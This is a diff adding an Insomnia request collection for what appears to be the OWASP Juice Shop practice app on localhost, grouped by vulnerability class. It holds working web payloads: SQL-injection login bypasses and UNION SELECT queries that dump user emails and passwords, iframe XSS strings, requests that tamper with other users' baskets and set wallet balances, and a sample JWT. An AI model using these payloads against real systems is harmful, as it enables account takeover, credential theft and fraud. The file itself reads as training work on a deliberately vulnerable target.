@@ -1,0 +1,973 @@
+_type: export
+__export_format: 4
+__export_date: 2020-12-06T22:38:37.453Z
+__export_source: insomnia.desktop.app:v2020.5.0
+resources:
+  - _id: req_e487080e848b4ceeb82c748d92a48de0
+    parentId: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    modified: 1607279928936
+    created: 1607279814204
+    url: " http://localhost:3000/api/Users"
+    name: Create User Alice
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"email": "Alice",
+        	"password": "12345"
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_00d92efe97f34444a529dde5409a024b
+    authentication: {}
+    metaSortKey: -1607243666955
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    parentId: null
+    modified: 1607202372289
+    created: 1607202372289
+    name: Juice Shop
+    description: ""
+    scope: null
+    _type: workspace
+  - _id: req_21e49fdeaf634c7fb8ac7b790d8b86aa
+    parentId: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    modified: 1607279934568
+    created: 1607279870480
+    url: " http://localhost:3000/api/Users"
+    name: Create User Bob
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"email": "Bob",
+        	"password": "12345"
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_00d92efe97f34444a529dde5409a024b
+    authentication: {}
+    metaSortKey: -1607243666930
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_fc293ab740624f898ca597aa4978d9fe
+    parentId: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    modified: 1607281101540
+    created: 1607203135095
+    url: http://localhost:3000/rest/user/login
+    name: Master Login
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"email":"Alice",
+        	"password":"12345"
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_079a857ef247428f898aaff86bf962d6
+    authentication: {}
+    metaSortKey: -1607243666905
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_271e8de096744e56a83c55f6d71a95ca
+    parentId: fld_fc627289a60541798be5cac6c680c7a0
+    modified: 1607280756855
+    created: 1607203967427
+    url: http://localhost:3000/rest/user/login
+    name: login User (SQL Injection)
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"email":"Alice'--",
+        	"password":"1"
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_079a857ef247428f898aaff86bf962d6
+    authentication: {}
+    metaSortKey: -1607202957556
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: fld_fc627289a60541798be5cac6c680c7a0
+    parentId: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    modified: 1607280824394
+    created: 1607243611018
+    name: Broken Auth
+    description: ""
+    environment: {}
+    environmentPropertyOrder: null
+    metaSortKey: -1607243666880
+    _type: request_group
+  - _id: req_78515a93a82641cea4883e477edc8078
+    parentId: fld_fc627289a60541798be5cac6c680c7a0
+    modified: 1607280771101
+    created: 1607205875552
+    url: http://localhost:3000/rest/user/login
+    name: login Admin (SQL Injection)
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"email":"' OR true --",
+        	"password":"1"
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_079a857ef247428f898aaff86bf962d6
+    authentication: {}
+    metaSortKey: -1607202957506
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_6cc6338fbf4249b4b8252270d6558974
+    parentId: fld_1dcf9c675fa94788bc6e86d540f99b2b
+    modified: 1607281654545
+    created: 1607281603689
+    url: http://localhost:3000/rest/products/search
+    name: Search SQL I
+    description: ""
+    method: GET
+    body: {}
+    parameters:
+      - name: q
+        value: "')) UNION SELECT * FROM x--"
+        description: ""
+        id: pair_a3dcb7e4bff046adae557d23553631ca
+      - name: ""
+        value: ""
+        description: ""
+        id: pair_2e1bd4a22b5c42fdb7562c5375636da5
+    headers: []
+    authentication: {}
+    metaSortKey: -1607202957456
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: fld_1dcf9c675fa94788bc6e86d540f99b2b
+    parentId: fld_fc627289a60541798be5cac6c680c7a0
+    modified: 1607281563473
+    created: 1607281560975
+    name: SQL Injection
+    description: ""
+    environment: {}
+    environmentPropertyOrder: null
+    metaSortKey: -1607202957456
+    _type: request_group
+  - _id: req_aaea788bb2774aedb3a65f9d2ead91ca
+    parentId: fld_1dcf9c675fa94788bc6e86d540f99b2b
+    modified: 1607281663434
+    created: 1607281659656
+    url: http://localhost:3000/rest/products/search
+    name: Search SQL II
+    description: ""
+    method: GET
+    body: {}
+    parameters:
+      - name: q
+        value: "')) UNION SELECT * FROM Users--"
+        description: ""
+        id: pair_a3dcb7e4bff046adae557d23553631ca
+      - name: ""
+        value: ""
+        description: ""
+        id: pair_2e1bd4a22b5c42fdb7562c5375636da5
+    headers: []
+    authentication: {}
+    metaSortKey: -1607202957431
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_00c6c14e6dd44b949cf2ad2b29136ed8
+    parentId: fld_1dcf9c675fa94788bc6e86d540f99b2b
+    modified: 1607281692279
+    created: 1607281671100
+    url: http://localhost:3000/rest/products/search
+    name: Search SQL III
+    description: ""
+    method: GET
+    body: {}
+    parameters:
+      - name: q
+        value: "')) UNION SELECT '1', '2', '3', '4', '5', '6', '7', '8', '9' FROM
+          Users--"
+        description: ""
+        id: pair_a3dcb7e4bff046adae557d23553631ca
+      - name: ""
+        value: ""
+        description: ""
+        id: pair_2e1bd4a22b5c42fdb7562c5375636da5
+    headers: []
+    authentication: {}
+    metaSortKey: -1607202957418.5
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_4447ef316f904727ac091c2b4e497b51
+    parentId: fld_1dcf9c675fa94788bc6e86d540f99b2b
+    modified: 1607281679499
+    created: 1607280805417
+    url: http://localhost:3000/rest/products/search
+    name: Search SQL IV
+    description: ""
+    method: GET
+    body: {}
+    parameters:
+      - name: q
+        value: qwert')) UNION SELECT id, email, password, '4', '5', '6', '7', '8', '9'
+          FROM Users--
+        description: ""
+        id: pair_a3dcb7e4bff046adae557d23553631ca
+    headers: []
+    authentication: {}
+    metaSortKey: -1607202957406
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_c1cd5da46ab94d47b4266021d0005681
+    parentId: fld_da22d6caafaf42c8a9a21508bd626ca4
+    modified: 1607294057974
+    created: 1607294052098
+    url: http://localhost:3000/rest/user/login
+    name: Token
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"email":"Alice",
+        	"password":"12345"
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_079a857ef247428f898aaff86bf962d6
+    authentication: {}
+    metaSortKey: -1607207931397
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: fld_da22d6caafaf42c8a9a21508bd626ca4
+    parentId: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    modified: 1607280858658
+    created: 1607207924433
+    name: Sensitive Data Exposure
+    description: ""
+    environment: {}
+    environmentPropertyOrder: null
+    metaSortKey: -1607243666867.5
+    _type: request_group
+  - _id: req_f20bcdf91dee42268ad81c582b4979d3
+    parentId: fld_da22d6caafaf42c8a9a21508bd626ca4
+    modified: 1607207958564
+    created: 1607207931299
+    url: http://localhost:3000/api/BasketItems
+    name: GET
+    description: ""
+    method: GET
+    body: {}
+    parameters: []
+    headers: []
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607207931347
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_7221e1526f3741a99a1b2c4947ce17ed
+    parentId: fld_da22d6caafaf42c8a9a21508bd626ca4
+    modified: 1607294189643
+    created: 1607205829499
+    url: http://localhost:3000/rest/user/authentication-details
+    name: ADMIN GET Users
+    description: ""
+    method: GET
+    body: {}
+    parameters: []
+    headers: []
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607207931297
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_30fd9ce88aa643589063ecb1dfe44d44
+    parentId: fld_aaa95485448240b497f84727d5fe77f9
+    modified: 1607293939387
+    created: 1607242244672
+    url: http://localhost:3000/rest/products/1/reviews
+    name: GET Reviews
+    description: ""
+    method: GET
+    body: {}
+    parameters: []
+    headers: []
+    authentication: {}
+    metaSortKey: -1607242244672
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: fld_aaa95485448240b497f84727d5fe77f9
+    parentId: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    modified: 1607294248082
+    created: 1607242240824
+    name: Broken Access Control
+    description: ""
+    environment: {}
+    environmentPropertyOrder: null
+    metaSortKey: -1607243666861.25
+    _type: request_group
+  - _id: req_6a96f75183c4432a91ac42545d63efe4
+    parentId: fld_aaa95485448240b497f84727d5fe77f9
+    modified: 1607293945411
+    created: 1607242327997
+    url: http://localhost:3000/rest/products/1/reviews
+    name: PUT Review
+    description: ""
+    method: PUT
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"message": "All your base are belong to us!",
+        	"author": "JUG IN"
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_0653e8f228324e759fc0b5762eca790c
+    authentication: {}
+    metaSortKey: -1607225088009.5
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_7be45865c66c4c6d891011f55845eeaf
+    parentId: fld_aaa95485448240b497f84727d5fe77f9
+    modified: 1607294002697
+    created: 1607280888443
+    url: http://localhost:3000/api/BasketItems
+    name: Add Item
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: >-
+        {
+        	"ProductId": 13,
+        	"BasketId": "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe', 'b64::JC5hdXRoZW50aWNhdGlvbi5iaWQ=::46b', 'when-expired', 3600 %}",
+        	"quantity": 10
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_73d55f63c8b440718e9b06313b881b07
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607225087997
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_56fda5d6c41348dbbf6cbef89e300e9d
+    parentId: fld_aaa95485448240b497f84727d5fe77f9
+    modified: 1607293995042
+    created: 1607280938501
+    url: http://localhost:3000/api/BasketItems
+    name: Add Item for other fail
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"ProductId": 13,
+        	"BasketId": "1",
+        	"quantity": 10
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_73d55f63c8b440718e9b06313b881b07
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607225087984.5
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_9b993b16a20f4517b875c9d039bc1aff
+    parentId: fld_aaa95485448240b497f84727d5fe77f9
+    modified: 1607293992644
+    created: 1607207988788
+    url: http://localhost:3000/api/BasketItems
+    name: Add Item for others
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: >-
+        {
+        	"ProductId": 13,
+        	"BasketId": "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe', 'b64::JC5hdXRoZW50aWNhdGlvbi5iaWQ=::46b', 'when-expired', 3600 %}",
+        	"quantity": 10,
+        	"BasketId": "1"
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_73d55f63c8b440718e9b06313b881b07
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607225087959.5
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_be39cf2e3ba046c0ade9e80fd2d5b315
+    parentId: fld_064c5f2319734175b33b070a8e51531b
+    modified: 1607294146869
+    created: 1607208133760
+    url: http://localhost:3000/api/BasketItems
+    name: Get Rich!!
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: >-
+        {
+        	"ProductId": 12,
+        	"BasketId": "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe', 'b64::JC5hdXRoZW50aWNhdGlvbi5iaWQ=::46b', 'when-expired', 3600 %}",
+        	"quantity": -100
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_73d55f63c8b440718e9b06313b881b07
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607202406199
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: fld_064c5f2319734175b33b070a8e51531b
+    parentId: fld_aaa95485448240b497f84727d5fe77f9
+    modified: 1607294137423
+    created: 1607202382251
+    name: Broken Design
+    description: ""
+    environment: {}
+    environmentPropertyOrder: null
+    metaSortKey: -1607225087859.5
+    _type: request_group
+  - _id: req_408210d508fb46c0bc52ce854470b7f6
+    parentId: fld_064c5f2319734175b33b070a8e51531b
+    modified: 1607294154289
+    created: 1607202406149
+    url: http://localhost:3000/rest/wallet/balance
+    name: Wallet
+    description: ""
+    method: GET
+    body: {}
+    parameters: []
+    headers: []
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607202406149
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_bd141ff472fc469f9ee1d79878a6fbcf
+    parentId: fld_064c5f2319734175b33b070a8e51531b
+    modified: 1607294159923
+    created: 1607202486982
+    url: http://localhost:3000/rest/wallet/balance
+    name: Get even Richer!!
+    description: ""
+    method: PUT
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"balance":"1000"
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_cc045bd1fd6f44f9b1b25e9f4bda84a1
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1606923674491
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_9aa4cf990ad64821bb95f08e97654e30
+    parentId: fld_5b0253250f614a678fba0531bff5c452
+    modified: 1607280795604
+    created: 1607243670832
+    url: http://localhost:3000/rest/products/search
+    name: Search
+    description: ""
+    method: GET
+    body: {}
+    parameters:
+      - name: q
+        value: "'))--"
+        description: ""
+        id: pair_a3dcb7e4bff046adae557d23553631ca
+    headers: []
+    authentication: {}
+    metaSortKey: -1607243670932
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: fld_5b0253250f614a678fba0531bff5c452
+    parentId: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    modified: 1607280790728
+    created: 1607243666855
+    name: XSS
+    description: ""
+    environment: {}
+    environmentPropertyOrder: null
+    metaSortKey: -1607243666855
+    _type: request_group
+  - _id: req_d03ded0ce2ab43cab8cbf2c8edcb476e
+    parentId: fld_5b0253250f614a678fba0531bff5c452
+    modified: 1607280794047
+    created: 1607275311070
+    url: http://localhost:3000/rest/saveLoginIp
+    name: IP
+    description: ""
+    method: GET
+    body: {}
+    parameters: []
+    headers:
+      - name: X-Forwarded-For
+        value: 1.1.1.1
+        description: ""
+        id: pair_bd46f6c938fe4c298363c4fd733f4de4
+      - name: True-Client-IP
+        value: <iframe src="javascript:alert(``xss``)">
+        description: ""
+        id: pair_41b166249beb4f06947d86d43b0df435
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607243670882
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_486fca75390b41ff9c73d41c5e5da684
+    parentId: fld_5b0253250f614a678fba0531bff5c452
+    modified: 1607281069015
+    created: 1607273579555
+    url: http://localhost:3000/api/Products
+    name: Product List
+    description: ""
+    method: GET
+    body: {}
+    parameters: []
+    headers: []
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607243670832
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_f42ab67acb244fe5b5f17df204170446
+    parentId: fld_5b0253250f614a678fba0531bff5c452
+    modified: 1607281142084
+    created: 1607273700518
+    url: http://localhost:3000/api/Products
+    name: POST XSS Product
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"name": "XSS",
+        	"description": "<iframe src=\"javascript:alert('xss')\">",
+        	"price": 47.11
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_b378d7bbef9745b885e8cba7e921bbb1
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607243670782
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_99d1c2618bd74788af50f926b315a708
+    parentId: fld_5b0253250f614a678fba0531bff5c452
+    modified: 1607293790183
+    created: 1607273424830
+    url: " http://localhost:3000/api/Users"
+    name: Create User (XSS)
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"email": "<iframe src=\"javascript:alert(xss)\">",
+        	"password": "xss"
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_00d92efe97f34444a529dde5409a024b
+    authentication: {}
+    metaSortKey: -1607243670732
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_b5ef3d8cf57a4286b72e0d8a354de9b5
+    parentId: fld_ee415ec223c64cb2a707494b6c5f02b5
+    modified: 1607294235972
+    created: 1607203556942
+    url: http://localhost:3000/rest/user/whoami
+    name: whoami
+    description: ""
+    method: GET
+    body: {}
+    parameters:
+      - name: ""
+        value: ""
+        description: ""
+        id: pair_77e44dc22c0b4dc69f22901730caf8e7
+    headers: []
+    authentication:
+      type: bearer
+      token: ""
+    metaSortKey: -1607202779867
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: fld_ee415ec223c64cb2a707494b6c5f02b5
+    parentId: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    modified: 1607294217744
+    created: 1607202773265
+    name: Stuff
+    description: ""
+    environment: {}
+    environmentPropertyOrder: null
+    metaSortKey: -1607202773265
+    _type: request_group
+  - _id: req_38063eb40ecd4a14a0c7f065dcbd8f3b
+    parentId: fld_ee415ec223c64cb2a707494b6c5f02b5
+    modified: 1607294224353
+    created: 1607202779817
+    url: http://localhost:3000/rest/deluxe-membership
+    name: DELUXE
+    description: ""
+    method: GET
+    body: {}
+    parameters: []
+    headers: []
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607202779817
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_6d63ab53fad04fb6b80ece2d9ea040b1
+    parentId: fld_ee415ec223c64cb2a707494b6c5f02b5
+    modified: 1607294229092
+    created: 1607202994342
+    url: http://localhost:3000/rest/deluxe-membership
+    name: DELUXE
+    description: ""
+    method: POST
+    body:
+      mimeType: application/json
+      text: |-
+        {
+        	"paymentMode":"wallet"
+        }
+    parameters: []
+    headers:
+      - name: Content-Type
+        value: application/json
+        id: pair_36a810d6afee42c6b381209c85a0be0b
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607202674947
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: req_e5b330dd1e7f4f3590653eb30d8bd2b0
+    parentId: fld_ef41e13d55bf429ea9747d8ea032aaed
+    modified: 1607203422501
+    created: 1607202570077
+    url: http://localhost:3000/api/Cards/
+    name: GET
+    description: ""
+    method: GET
+    body: {}
+    parameters: []
+    headers: []
+    authentication:
+      type: bearer
+      token: "{% response 'body', 'req_fc293ab740624f898ca597aa4978d9fe',
+        'b64::JC5hdXRoZW50aWNhdGlvbi50b2tlbg==::46b', 'when-expired', 3600 %}"
+    metaSortKey: -1607202570077
+    isPrivate: false
+    settingStoreCookies: true
+    settingSendCookies: true
+    settingDisableRenderRequestBody: false
+    settingEncodeUrl: true
+    settingRebuildPath: true
+    settingFollowRedirects: global
+    _type: request
+  - _id: fld_ef41e13d55bf429ea9747d8ea032aaed
+    parentId: fld_ee415ec223c64cb2a707494b6c5f02b5
+    modified: 1607294233395
+    created: 1607202564768
+    name: Cards
+    description: ""
+    environment: {}
+    environmentPropertyOrder: null
+    metaSortKey: -1607202674897
+    _type: request_group
+  - _id: env_645394fe831f830313ab695146f06fd87c2d23b6
+    parentId: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    modified: 1607202455027
+    created: 1607202372541
+    name: Base Environment
+    data:
+      token: eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJhQGEuZGUiLCJwYXNzd29yZCI6IjgyN2NjYjBlZWE4YTcwNmM0YzM0YTE2ODkxZjg0ZTdiIiwicm9sZSI6ImN1c3RvbWVyIiwiZGVsdXhlVG9rZW4iOiIiLCJsYXN0TG9naW5JcCI6IjAuMC4wLjAiLCJwcm9maWxlSW1hZ2UiOiIvYXNzZXRzL3B1YmxpYy9pbWFnZXMvdXBsb2Fkcy9kZWZhdWx0LnN2ZyIsInRvdHBTZWNyZXQiOiIiLCJpc0FjdGl2ZSI6dHJ1ZSwiY3JlYXRlZEF0IjoiMjAyMC0xMi0wNSAyMDo0NToyMS42NDUgKzAwOjAwIiwidXBkYXRlZEF0IjoiMjAyMC0xMi0wNSAyMDo0NToyMS42NDUgKzAwOjAwIiwiZGVsZXRlZEF0IjpudWxsfSwiaWF0IjoxNjA3MjAxNDAxLCJleHAiOjE2MDcyMTk0MDF9.KD3XhtCR1Pk5XRfqxOv6Bm5XeGkPSYOlRnjrUWAW8OfMDbY3rH58YQ18Bls5ZDWQyEnU_z7eO9H9L4rHQY_gnfEud1KtaitHK5kO2kVAXsjt9iWHxKJ2a1Zay_szCqyZbT5fkSdJfBP5yWGlS4BqAwX2-3Haufvt8k17b4Z3QhU
+    dataPropertyOrder:
+      "&":
+        - token
+    color: null
+    isPrivate: false
+    metaSortKey: 1607202372541
+    _type: environment
+  - _id: jar_645394fe831f830313ab695146f06fd87c2d23b6
+    parentId: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    modified: 1607255931650
+    created: 1607202372548
+    name: Default Jar
+    cookies:
+      - key: __cfduid
+        value: dc54ef9b1a25c7545c810ca98b896eecb1607255930
+        expires: 2021-01-05T11:58:50.000Z
+        domain: mmst.eu
+        path: /
+        secure: true
+        httpOnly: true
+        extensions:
+          - SameSite=Lax
+        hostOnly: false
+        creation: 2020-12-06T11:58:51.642Z
+        lastAccessed: 2020-12-06T11:58:51.642Z
+        id: "9166474463713132"
+    _type: cookie_jar
+  - _id: spc_01aaf9e43fd0476fa776c16e6aaa935e
+    parentId: wrk_1399c064a6bb4e19a786d80dbe84e49b
+    modified: 1607202372301
+    created: 1607202372301
+    fileName: Juice Shop
+    contents: ""
+    contentType: yaml
+    _type: api_spec
